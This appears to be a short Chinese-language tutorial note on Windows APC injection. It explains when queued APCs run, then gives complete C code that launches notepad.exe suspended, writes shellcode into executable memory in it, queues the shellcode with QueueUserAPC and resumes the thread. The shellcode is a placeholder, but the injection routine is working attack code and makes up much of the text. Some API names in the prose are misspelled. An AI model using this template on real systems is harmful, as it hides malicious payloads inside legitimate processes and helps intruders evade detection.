

只有当一个线程

内部调用`SleepEx`、`SignalObjectAdndWait`、`WaitForSingleObjectEx`、`WaitForMultioleObjectsEx` 等

特定函数将自己处于**挂起状态**时，才会执行APC队列函数

我们利用QueueUserApc,往这个队列中插入一个回调函数



压入队列后，线程将按照顺序优先级执行(FIFO)

这种注入技术的缺点是只有当线程处在alertable状态时才去执行这些APC函数





原理如下:

```c
#include <Windows.h>
unsigned char shellcode[] = "<shellcode>";    //你的shellcode代码
int main()
{
    LPCSTR lpApplication = "C:\\Windows\\System32\\notepad.exe";   //path
    SIZE_T buff = sizeof(shellcode);      //size of shellcode
    STARTUPINFOA sInfo = { 0 };
    PROCESS_INFORMATION pInfo = { 0 };     //return a new process info
    CreateProcessA(lpApplication, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo);//以创建一进程为例子.然后挂起
    HANDLE hProc = pInfo.hProcess;
    HANDLE hThread = pInfo.hThread;


    LPVOID lpvShellAddress = VirtualAllocEx(hProc, NULL, buff, MEM_COMMIT, PAGE_EXECUTE_READWRITE);//直接开始APC注入
    PTHREAD_START_ROUTINE ptApcRoutine = (PTHREAD_START_ROUTINE)lpvShellAddress;
    WriteProcessMemory(hProc, lpvShellAddress, shellcode, buff, NULL);
    QueueUserAPC((PAPCFUNC)ptApcRoutine, hThread, NULL);//ptApcRoutine指向你的shellcode
    ResumeThread(hThread);

    return 0;
}
```



res还有一个代码

可以实现对指定进程的所有线程插入APC函数

原理是一样的

其中遇到的问题:如果自己写一个肉机代注入的话,就么效果

可能是它没内部调用`SleepEx`、`SignalObjectAdndWait`、`WaitForSingleObjectEx`、`WaitForMultioleObjectsEx` 等